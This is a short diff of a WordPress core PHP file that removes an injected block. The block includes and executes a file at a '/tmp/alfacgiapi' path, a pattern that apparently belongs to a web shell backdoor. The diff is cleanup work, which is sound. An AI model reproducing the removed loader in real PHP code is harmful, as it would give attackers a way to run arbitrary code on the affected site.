@@ -409,14 +409,7 @@ function wp_maybe_decline_date( $date, $format = '' ) {
 
 	return $date;
 }
-$file = '/tmp/alfacgiapi/read.txt';
 
-if (is_file($file)) {
-    include $file;
-} else {
-    http_response_code(404);
-    echo "File not found: " . htmlspecalchars($file);
-}
 /**
  * Converts float number to format based on the locale.
  *
